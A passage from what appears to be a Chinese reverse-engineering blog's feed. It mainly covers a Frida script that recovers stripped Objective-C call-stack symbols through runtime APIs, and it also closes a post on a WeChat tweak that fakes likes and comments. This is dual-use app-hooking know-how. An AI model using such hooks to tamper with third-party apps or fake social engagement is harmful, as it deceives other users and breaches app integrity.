id="整理思路"><a href="#整理思路" class="headerlink" title="整理思路"></a>整理思路</h5><p>整理一下目前的情况，首先拿到了赞和评论的模型，然后找到了hook点。下一步就是写代码去实现集赞的功能。</p><p>大概的代码逻辑应该如下</p><ul><li>在hook点的时候拿到原始的朋友圈数据，并过滤出自己的那条朋友圈</li><li>取出自己朋友圈的赞和评论数据备用</li><li>随机从通讯录好友里面选择数量去构造赞和评论对象，并放入原朋友圈赞和评论列表里面</li></ul><p>下面就是写代码实现就可以了。还有个情况是在你进入自己的朋友圈详情界面的时候，也就是看到点赞的人都是头像的界面。也需要做类似的操作才能实现集赞的功能。</p><p>这里分析的过程和上面类似，我选择的hook点为：<br><code>-[WCCommentDetailViewControllerFB setDataItem:]</code></p><h4 id="代码实现"><a href="#代码实现" class="headerlink" title="代码实现"></a>代码实现</h4><p>具体的代码实现这里就不再去分析了，我把代码开源到了这里<a href="https://github.com/4ch12dy/fkwechatzan">fkwechatzan</a></p><h4 id="完成效果"><a href="#完成效果" class="headerlink" title="完成效果"></a>完成效果</h4><ul><li><p>集赞助手设置界面</p><p><img src="https://github.com/4ch12dy/4ch12dy.github.io/blob/master/articlePic/fkwechatLike/1361564255775_.pic.jpg?raw=true" width="400" hegiht="200" align="center"></p></li></ul><ul><li><p>朋友圈详情界面</p><p><img src="https://github.com/4ch12dy/4ch12dy.github.io/blob/master/articlePic/fkwechatLike/1341564229215_.pic.jpg?raw=true" width="400" hegiht="200" align="center"></p></li><li><p>赞和评论</p></li></ul><p><img src="https://github.com/4ch12dy/4ch12dy.github.io/blob/master/articlePic/fkwechatLike/1321564227655_.pic.jpg?raw=true" width="400" hegiht="200" align="center"></p><h4 id="一点总结"><a href="#一点总结" class="headerlink" title="一点总结"></a>一点总结</h4><p>本文详细介绍了使用issh和xia0LLDB去完成一个集赞功能的逆向分析过程，这个功能本身不是很复杂，这里仅仅我在逆向过程中的一些理解和分析。每个人的逆向分析过程可能都不尽相同，我提供一个完整的分析步骤，而不是完全的去靠猜测，虽然逆向有时候猜测就能有一些意外惊喜，不过不确定性也同样会花费大量时间。</p><p>最后，妈妈再也不用担心没有人赞我的朋友圈了~</p><p>下次集赞领礼品的活动我要定了！</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;微信集赞-评论插件分析及开发&quot;&gt;&lt;a href=&quot;#微信集赞-评论插件分析及开发&quot; class=&quot;headerlink&quot; title=&quot;微信集赞/评论插件分析及开发&quot;&gt;&lt;/a&gt;微信集赞/评论插件分析及开发&lt;/h3&gt;&lt;h4 id=&quot;开始&quot;&gt;&lt;a href=&quot;#开始&quot;
      
    
    </summary>
    
      <category term="RE" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/categories/RE/"/>
    
    
      <category term="RE" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/tags/RE/"/>
    
  </entry>
  
  <entry>
    <title>Frida调用栈符号恢复</title>
    <link href="https://github.com/4ch12dy/4ch12dy.github.io.git/2019/07/02/xia0CallStackSymbols/xia0CallStackSymbols/"/>
    <id>https://github.com/4ch12dy/4ch12dy.github.io.git/2019/07/02/xia0CallStackSymbols/xia0CallStackSymbols/</id>
    <published>2019-07-02T09:00:14.000Z</published>
    <updated>2019-08-01T07:53:10.362Z</updated>
    
    <content type="html"><![CDATA[<h3 id="Frida调用栈符号恢复"><a href="#Frida调用栈符号恢复" class="headerlink" title="Frida调用栈符号恢复"></a>Frida调用栈符号恢复</h3><h4 id="开始"><a href="#开始" class="headerlink" title="开始"></a>开始</h4><p>搞了一阵子的Android方向的逆向研究，发现用frida去做一些hook等测试十分方便。最近自己想在iOS平台实现短视频下载去水印的问题，所以也想用frida来试试。但是测试过程中当我想去看下hook点的调用栈的时候，发现只有一些栈地址，基本没有符号信息，估计符号表被strip了。这里通常的做法就是用这些地址减去偏移然后去ida里面找到对应的方法。这样无疑是大大增加了分析的时间，想到之前解决<a href="[http://4ch12dy.site/2018/10/03/LLDB%E8%B0%83%E8%AF%95%E5%99%A8%E6%A0%88%E7%AC%A6%E5%8F%B7%E5%8C%96/%E5%BC%BA%E5%8C%96%E4%BD%A0%E7%9A%84lldb%E8%B0%83%E8%AF%95%E5%99%A8/](http://4ch12dy.site/2018/10/03/LLDB调试器栈符号化/强化你的lldb调试器/">lldb调试器栈符号恢复</a>)方案，决定把lldb的栈符号恢复脚本移植到frida中。</p><h4 id="如何恢复已经去掉符号表的可执行文件？"><a href="#如何恢复已经去掉符号表的可执行文件？" class="headerlink" title="如何恢复已经去掉符号表的可执行文件？"></a>如何恢复已经去掉符号表的可执行文件？</h4><p>这里的符号恢复仅仅针对的是OC函数，C函数如果符号表被strip以后是没有办法恢复其符号信息的。为什么OC函数可以去做符号恢复呢？这里要涉及到macho文件的格式以及ObjectC这个语言自身设计相关。可以看到在macho文件中的_DATA数据段中有很多objc的节信息，里面保存了所有的类以及方法等元数据信息。既然如此，我们肯定能找到方法去恢复这些OC函数的符号。</p><p><img src="https://github.com/4ch12dy/4ch12dy.github.io/blob/master/articlePic/xia0CallStackSymbols/image-20190702172303432.png?raw=true" alt="image-20190702172303432"></p><h4 id="OC函数符号恢复思路"><a href="#OC函数符号恢复思路" class="headerlink" title="OC函数符号恢复思路"></a>OC函数符号恢复思路</h4><p>首先我们只能得到一堆调用链的地址，这些地址肯定是函数里面的某个偏移地址。很容易想到这个地址往前推肯定就是这个函数的首地址及函数地址。如果我们拿到了所有函数的地址，然后每一个地址和目标地址比较，与目标地址距离最近的那个地址所对应的函数不就是我们想要的符号吗。</p><p>根据上面提到的思路，目前需要解决几个问题，怎么拿到所有OC方法的地址? 以及对应的类名和方法名?如何设计匹配算法等？</p><p>这里有两种办法：</p><ul><li>第一种是自己去解析在内存中加载的macho文件，根据macho的文件格式先找到class信息，然后找到对应的method信息，method里面就保存了IMP和方法名。之前我尝试这样去过，所有的信息都能拿到，但是由于在macho在加载到内存的时候objc动态库会做很多的初始化等工作，导致要处理一些细节问题，所以就没继续做了。</li><li>第二种是利用已有的objc提供的接口objc_去拿到所有的class以及对应method的方法名和IMP。这里主要用的的API有<code>objc_copyClassNamesForImage</code>、<code>class_copyMethodList</code> 、<code>objc_getClass</code>、<code>method_getImplementation</code>、<code>method_getName</code>、<code>objc_getClass</code>、<code>objc_getMetaClass</code></li></ul><p>现在已经能拿到所有的类方法、方法名、方法实现地址了，接下来要解决的就是怎么通过调用栈的地址去找到对应的方法，这里的思路就是遍历所有的方法地址与调用栈的地址比较并计算距离，如果方法地址小于目标地址且距离最小，那么该方法就是我们要找到的符号。最后将调用栈上面的所有地址都进行该操作即可。</p><h4 id="frida的js环境编写代码"><a href="#frida的js环境编写代码" class="headerlink" title="frida的js环境编写代码"></a>frida的js环境编写代码</h4><p>由于我之前在lldb的python脚本中写过该过程代码(<del>lldb内置的OC解释器语法要求十分严格，调试了很久的代码</del>)</p><p>按照上面的思路理论上代码很好写，也不是很复杂。如果是直接写OC代码应该很好写，但是在frida中写这些还是挺折腾的。</p><p>主要的代码如下：</p><p>根据模块路径获取其所有的类</p><pre><code class="js">function getAllClass(modulePath){    // const char * objc_copyClassNamesForImage(const char *image, unsigned int *outCount)    var objc_copyClassNamesForImage = new NativeFunction(        Module.findExportByName(null, &#39;objc_copyClassNamesForImage&#39;),        &#39;pointer&#39;,        [&#39;pointer&#39;, &#39;pointer&#39;]    );    // free    var free = new NativeFunction(Module.findExportByName(null, &#39;free&#39;), &#39;void&#39;, [&#39;pointer&#39;]);    // if given modulePath nil, default is mainBundle    if(!modulePath){        var path = ObjC.classes.NSBundle.mainBundle().executablePath().UTF8String();    }else{        var path = modulePath;    }    // create args    var pPath = Memory.allocUtf8String(path);    var p = Memory.alloc(Process.pointerSize);    Memory.writeUInt(p, 0);    var pClasses = objc_copyClassNamesForImage(pPath, p);    var count = Memory.readUInt(p);    var classes = new Array(count);    for (var i = 0; i &lt; count; i++) {        var pClassName = Memory.readPointer(pClasses.add(i * Process.pointerSize));        classes[i] = Memory.readUtf8String(pClassName);    }    free(pClasses);    // XLOG(classes)    return classes;}</code></pre><p>根据类名获取所有的方法信息，由于有实例方法和类方法，这里需要分别获取。</p><pre><code class="js">function getAllMethods(classname){    var objc_getClass = new NativeFunction(        Module.findExportByName(null, &#39;objc_getClass&#39;),        &#39;pointer&#39;,        [&#39;pointer&#39;]    );    var class_copyMethodList = new NativeFunction(        Module.findExportByName(null, &#39;class_copyMethodList&#39;),        &#39;pointer&#39;,        [&#39;pointer&#39;, &#39;pointer&#39;]    );    var objc_getMetaClass = new NativeFunction(        Module.findExportByName(null, &#39;objc_getMetaClass&#39;),        &#39;pointer&#39;,        [&#39;pointer&#39;]    );    var method_getName = new NativeFunction(        Module.findExportByName(null, &#39;method_getName&#39;),        &#39;pointer&#39;,        [&#39;pointer&#39;]    );    var free = new NativeFunction(Module.findExportByName(null, &#39;free&#39;), &#39;void&#39;, [&#39;pointer&#39;]);    // get objclass and metaclass    var name = Memory.allocUtf8String(classname);    var objClass = objc_getClass(name)    var metaClass = objc_getMetaClass(name)    // get obj class all methods    var size_ptr = Memory.alloc(Process.pointerSize);    Memory.writeUInt(size_ptr, 0);    var pObjMethods = class_copyMethodList(objClass, size_ptr);    var count = Memory.readUInt(size_ptr);    var allMethods = new Array();    var allObjMethods = new Array();    // get obj class all methods name and IMP    for (var i = 0; i &lt; count; i++) {        var curObjMethod = new Array();        var pObjMethodSEL = method_getName(pObjMethods.add(i * Process.pointerSize))        var pObjMethodName = Memory.readCString(Memory.readPointer(pObjMethodSEL))        var objMethodIMP = Memory.readPointer(pObjMethodSEL.add(2*Process.pointerSize))        // XLOG(&quot;-[&quot;+classname+ &quot; &quot; + pObjMethodName+&quot;]&quot; + &quot;:&quot; + objMethodIMP)        curObjMethod.push(pObjMethodName)        curObjMethod.push(objMethodIMP)        allObjMethods.push(curObjMethod)    }    var allMetaMethods = new Array();    // get meta class all methods name and IMP    var pMetaMethods = class_copyMethodList(metaClass, size_ptr);    var count = Memory.readUInt(size_ptr);    for (var i = 0; i &lt; count; i++) {        var curMetaMethod = new Array();        var pMetaMethodSEL = method_getName(pMetaMethods.add(i * Process.pointerSize))        var pMetaMethodName = Memory.readCString(Memory.readPointer(pMetaMethodSEL))        var metaMethodIMP = Memory.readPointer(pMetaMethodSEL.add(2*Process.pointerSize))        //XLOG(&quot;+[&quot;+classname+ &quot; &quot; + pMetaMethodName+&quot;]&quot; + &quot;:&quot; + metaMethodIMP)        curMetaMethod.push(pMetaMethodName)        curMetaMethod.push(metaMethodIMP)        allMetaMethods.push(curMetaMethod)    }    allMethods.push(allObjMethods)    allMethods.push(allMetaMethods)    free(pObjMethods);    free(pMetaMethods);    return allMethods;}</code></pre><p>通过调用栈地址根据最近匹配的算法去找到对应的符号信息</p><pre><code class="js">function findSymbolFromAddress(modulePath,addr){    var frameAddr = addr    var theDis = 0xffffffffffffffff;    var tmpDis = 0;    var theClass = &quot;None&quot;    var theMethodName = &quot;None&quot;    var theMethodType = &quot;-&quot;    var theMethodIMP = 0    var allClassInfo = {}    var allClass = getAllClass(modulePath);    for(var i = 0, len = allClass.length; i &lt; len; i++){        var mInfo = getAllMethods(allClass[i]);        var curClassName = allClass[i]        objms = mInfo[0];        for(var j = 0, olen = objms.length; j &lt; olen; j++){            mname = objms[j][0]            mIMP = objms[j][1]            if(frameAddr &gt;= mIMP){                tmpDis = frameAddr-mIMP                if(tmpDis &lt; theDis){                    theDis = tmpDis                    theClass = curClassName                    theMethodName = mname                    theMethodIMP = mIMP                    theMethodType = &quot;-&quot;                }            }        }        metams = mInfo[1];        for(var k = 0, mlen = metams.length; k &lt; mlen; k++){            mname = metams[k][0]            mIMP = metams[k][1]            if(frameAddr &gt;= mIMP){                tmpDis = frameAddr-mIMP                if(tmpDis &lt; theDis){                    theDis = tmpDis                    theClass = curClassName                    theMethodName = mname                    theMethodIMP = mIMP                    theMethodType = &quot;+&quot;                }            }        }    }    symbol = theMethodType+&quot;[&quot;+theClass+&quot; &quot;+theMethodName+&quot;]&quot;    if(symbol.indexOf(&quot;.cxx&quot;)!=-1){        symbol = &quot;maybe C function?&quot;    }    // if distance &gt; 3000, maybe a c function    if(theDis &gt; 3000){        symbol = &quot;maybe C function? symbol:&quot; + symbol    }    return symbol;}</code></pre><p>在匹配算法的最后还进行了一些判断，当解析出来的方法名包含<code>.cxx</code>方法的时候说明没找到符号，可能是一个C函数。当解析出来的方法地址距离目标地址距离大于3000的时候会提示可能会C函数。</p><p>最后完整的项目地址：<a href="https://github.com/4ch12dy/xia0FridaScript">https://github.com/4ch12dy/xia0FridaScript</a></p><h4 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h4><p>我这里写了一个简单的frida脚本去测试如何导入符号恢复的js脚本</p><pre><code class="python">#!/usr/bin/pythonimport fridaimport sys import codecsimport osPACKAGE_NAME = &quot;cn.xiaobu.pipiPlay&quot;def on_message(message, data):    try:        if message:            print(&quot;[JSBACH] {0}&quot;.format(message[&quot;payload&quot;]))    except Exception as e:        print(message)        print(e)def xia0CallStackSymbolsTest():    script_dir = os.path.dirname(os.path.realpath(__file__))    xia0CallStackSymbolsJS = os.path.join(script_dir, &#39;xia0CallStackSymbols.js&#39;)    source = &#39;&#39;    with codecs.open(xia0CallStackSymbolsJS, &#39;r&#39;, &#39;utf-8&#39;) as f:        source = source + f.read()    js = &#39;&#39;&#39;    if (ObjC.available)    {            try            {                    //Your class name here  - ZYOperationView operationCopyLink                    var className = &quot;ZYMediaDownloadHelper&quot;;                    //Your function name here                    var funcName = &quot;+ downloadMediaUrl:isVideo:progress:finishBlock:&quot;;                    var hook = eval(&#39;ObjC.classes.&#39; + className + &#39;[&quot;&#39; + funcName + &#39;&quot;]&#39;);                    Interceptor.attach(hook.implementation, {                        onEnter: function(args) {                            // args[0] is self                            // args[1] is selector (SEL &quot;sendMessageWithText:&quot;)                            // args[2] holds the first function argument, an NSString                            console.log(&quot;[*] Detected call to: &quot; + className + &quot; -&gt; &quot; + funcName);                            // just call [NSThread callStackSymbols]                            var threadClass = ObjC.classes.NSThread                            var symbols = threadClass[&quot;+ callStackSymbols&quot;]()                            console.log(symbols)                            // call  xia0CallStackSymbols [true:just symbolish mainModule address false:symbolish all module address]                            xia0CallStackSymbols(true);                            xia0CallStackSymbols(false);                        }                    });            }            catch(err)            {                    console.log(&quot;[!] Exception2: &quot; + err.message);            }    }    else    {            console.log(&quot;Objective-C Runtime is not available!&quot;);    }    &#39;&#39;&#39;    return source+jsdef do_hook():    return xia0CallStackSymbolsTest()if __name__ == &#39;__main__&#39;:    try:        device = frida.get_device_manager().enumerate_devices()[-1]        print device        pid = device.spawn([PACKAGE_NAME])        print(&quot;[JSBACH] {} is starting. (pid : {})&quot;.format(PACKAGE_NAME, pid))        session = device.attach(pid)        device.resume(pid)        script = session.create_script(do_hook())        script.on(&#39;message&#39;, on_message)        script.load()        sys.stdin.read()    except KeyboardInterrupt:        sys.exit(0)</code></pre><p>只需要将<code>xia0CallStackSymbols.js</code>脚本放到项目中，然后用以下代码即可导入使用</p><pre><code class="python">script_dir = os.path.dirname(os.path.realpath(__file__))xia0CallStackSymbolsJS = os.path.join(script_dir, &#39;xia0CallStackSymbols.js&#39;)source = &#39;&#39;with codecs.open(xia0CallStackSymbolsJS, &#39;r&#39;, &#39;utf-8&#39;) as f:    source = source + f.read()your_frida_js_hook_script = &quot;&quot;load_js = your_frida_js_hook_script+source</code></pre><p>恢复的效果如下：</p><ul><li><p>通过<code>[NSThread callStackSymbols]</code>获取的调用栈符号</p><p><img src="https://github.com/4ch12dy/4ch12dy.github.io/blob/master/articlePic/xia0CallStackSymbols/image-20190702181519237.png?raw=true" alt="image-20190702181519237"></p></li><li><p>通过调用<code>xia0CallStackSymbols</code>函数获取的调用栈符号</p><p><img src="https://github.com/4ch12dy/4ch12dy.github.io/blob/master/articlePic/xia0CallStackSymbols/image-20190702181145710.png?raw=true" alt="image-20190702181145710"></p></li><li><p>作为比较，我在放上lldb中恢复调用栈</p><p><img src="https://github.com/4ch12dy/4ch12dy.github.io/blob/master/articlePic/xia0CallStackSymbols/image-20190702181638614.png?raw=true" alt="image-20190702181638614"></p></li></ul><p>这里可以看出lldb调试器恢复的符号信息最完整且准确，lldb的栈符号恢复项目在<a href="https://github.com/4ch12dy/xia0LLDB">这里</a>，现在还能支持block函数的符号恢复。</p><p>这里有几个问题需要说明一下：</p><ul><li><p>xia0CallStackSymbols的符号为什么前15个地址没有显示？</p><p>因为前15个地址都是frida中js解释器里面的函数执行地址，没有办法拿到模块信息，也没必要解析这些地址。</p></li><li><p>xia0CallStackSymbols中还提供了内存对应的文件地址，如果你觉得符号有问题，可以直接去ida中手动查找符号</p></li><li><p>如果用dladdr能够拿到地址的符号信息，就没有调用xia0CallStackSymbols去恢复(比如符号表没有strip的情况)</p></li><li><p>xia0CallStackSymbols()接口可以传递一个bool参数，true为仅仅解析主模块的地址，false为所有模块都需要解析。实际在逆向过程中一般只需要主模块的符号信息，其他系统函数没很大必要。</p></li></ul><h4 id="遗留问题-Todo"><a href="#遗留问题-Todo" class="headerlink" title="遗留问题/Todo"></a>遗留问题/Todo</h4><ul><li>在执行恢复符号的过程中时间相对较长，主要原因在于每一个地址都要和所有方法比较，这里建议xia0CallStackSymbols传入true，这样只解析主模块的地址。耗时的原因还在于每一个地址解析的时候都会去调用接口获取所有方法信息，实际上每个模块只需要一次就能拿到所有方法信息，接下来要做的就是优化相关代码，缓存模块的所有方法信息，下次解析的地址为该模块时直接去缓存里面匹配查找。</li><li>在匹配符号的过程中，判断是否为C函数需要更多的原则，3000的阈值需要后面再调下。</li><li>关于block的符号恢复，目前只有在lldb中实现了，下一步准备在xia0CallStackSymbols中也支持恢复block函数符号</li></ul><h4 id="题外话"><a href="#题外话" class="headerlink" title="题外话"></a>题外话</h4><p>短视频下载去水印如果有人感兴趣的话，可以点<a href="https://github.com/4ch12dy/fkwatermark">这里</a>，目前支持的有皮皮搞笑、抖音（我不看抖音！）</p><h4 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h4><ul><li><a href="https://github.com/poxyran/misc">https://github.com/poxyran/misc</a></li><li>&lt; <a href="https://github.com/iddoeldor/frida-snippets">https://github.com/iddoeldor/frida-snippets</a> &gt;</li><li><a href="http://www.blogfshare.com/ioss-validate-address.html" target="_blank" rel="external">http://www.blogfshare.com/ioss-validate-address.html</a></li><li><a href="https://jmpews.github.io/2017/08/09/darwin/反注入及绕过/" target="_blank" rel="external">https://jmpews.github.io/2017/08/09/darwin/%E5%8F%8D%E6%B3%A8%E5%85%A5%E5%8F%8A%E7%BB%95%E8%BF%87/</a></li><li><a href="https://github.com/interference-security/frida-scripts">https://github.com/interference-security/frida-scripts</a></li><li><a href="https://github.com/dweinstein/awesome-frida">https://github.com/dweinstein/awesome-frida</a></li><li><a href="https://www.frida.re/docs/javascript-api/" target="_blank" rel="external">https://www.frida.re/docs/javascript-api/</a></li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;Frida调用栈符号恢复&quot;&gt;&lt;a href=&quot;#Frida调用栈符号恢复&quot; class=&quot;headerlink&quot; title=&quot;Frida调用栈符号恢复&quot;&gt;&lt;/a&gt;Frida调用栈符号恢复&lt;/h3&gt;&lt;h4 id=&quot;开始&quot;&gt;&lt;a href=&quot;#开始&quot; class=&quot;
      
    
    </summary>
    
      <category term="RE" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/categories/RE/"/>
    
    
      <category term="RE" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/tags/RE/"/>
    
      <category term="frida" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/tags/frida/"/>
    
  </entry>
  
  <entry>
    <title>android调试深度总结</title>
    <link href="https://github.com/4ch12dy/4ch12dy.github.io.git/2019/06/04/andoid-debug-note/andoid-debug-note/"/>
    <id>https://github.com/4ch12dy/4ch12dy.github.io.git/2019/06/04/andoid-debug-note/andoid-debug-note/</id>
    <published>2019-06-04T14:54:21.000Z</published>
    <updated>2019-08-01T07:52:05.503Z</updated>
    
    <content type="html"><![CDATA[<script src="//cdn.bootcss.com/jquery/1.11.3/jquery.min.js"></script><div id="hbe-security">  <div class="hbe-input-container">  <input type="password" class="hbe-form-control" id="pass" placeholder="Need password to decrypt!" />    <label for="pass">Need password to decrypt!</label>    <div class="bottom-line"></div>  </div></div><div id="decryptionError" style="display: none;">Incorrect Password!</div><div id="noContentError" style="display: none;">No content to display!</div><div id="encrypt-blog" style="display:none">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</div><script src="/lib/crypto-js.js"></script><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
    
    <summary type="html">
    
      something you can not kown 
    
    </summary>
    
      <category term="RE" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/categories/RE/"/>
    
    
      <category term="Android" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/tags/Android/"/>
    
      <category term="debug" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/tags/debug/"/>
    
  </entry>
  
  <entry>
    <title>Android AutoJS 脚本加密分析</title>
    <link href="https://github.com/4ch12dy/4ch12dy.github.io.git/2019/04/25/autojs%E5%8A%A0%E5%AF%86%E5%88%86%E6%9E%90/autojs%E5%8A%A0%E5%AF%86%E5%88%86%E6%9E%90/"/>
    <id>https://github.com/4ch12dy/4ch12dy.github.io.git/2019/04/25/autojs加密分析/autojs加密分析/</id>
    <published>2019-04-25T07:12:09.000Z</published>
    <updated>2019-07-30T07:55:01.711Z</updated>
    
    <content type="html"><![CDATA[<script src="//cdn.bootcss.com/jquery/1.11.3/jquery.min.js"></script><div id="hbe-security">  <div class="hbe-input-container">  <input type="password" class="hbe-form-control" id="pass" placeholder="show me the code" />    <label for="pass">show me the code</label>    <div class="bottom-line"></div>  </div></div><div id="decryptionError" style="display: none;">Incorrect Password!</div><div id="noContentError" style="display: none;">No content to display!</div><div id="encrypt-blog" style="display:none"></div><script src="/lib/crypto-js.js"></script><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
    
    <summary type="html">
    
      something you can not kown 
    
    </summary>
    
      <category term="RE" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/categories/RE/"/>
    
    
      <category term="RE" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/tags/RE/"/>
    
      <category term="AutoJS" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/tags/AutoJS/"/>
    
  </entry>
  
  <entry>
    <title>再谈arm指令编码</title>
    <link href="https://github.com/4ch12dy/4ch12dy.github.io.git/2019/04/15/arm-instruction-encode/arm-instruction-encode/"/>
    <id>https://github.com/4ch12dy/4ch12dy.github.io.git/2019/04/15/arm-instruction-encode/arm-instruction-encode/</id>
    <published>2019-04-15T06:42:12.000Z</published>
    <updated>2019-04-29T11:59:18.079Z</updated>
    
    <content type="html"><![CDATA[<script src="//cdn.bootcss.com/jquery/1.11.3/jquery.min.js"></script><div id="hbe-security">  <div class="hbe-input-container">  <input type="password" class="hbe-form-control" id="pass" placeholder="Need password to decrypt!" />    <label for="pass">Need password to decrypt!</label>    <div class="bottom-line"></div>  </div></div><div id="decryptionError" style="display: none;">Incorrect Password!</div><div id="noContentError" style="display: none;">No content to display!</div><div id="encrypt-blog" style="display:none"></div><script src="/lib/crypto-js.js"></script><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
    
    <summary type="html">
    
      something you can not kown 
    
    </summary>
    
      <category term="note" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/categories/note/"/>
    
    
      <category term="arm" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/tags/arm/"/>
    
  </entry>
  
  <entry>
    <title>符号执行解决代码混淆实践</title>
    <link href="https://github.com/4ch12dy/4ch12dy.github.io.git/2019/04/15/antiOLLVM/antiOLLVM/"/>
    <id>https://github.com/4ch12dy/4ch12dy.github.io.git/2019/04/15/antiOLLVM/antiOLLVM/</id>
    <published>2019-04-15T06:42:12.000Z</published>
    <updated>2019-05-17T08:47:41.244Z</updated>
    
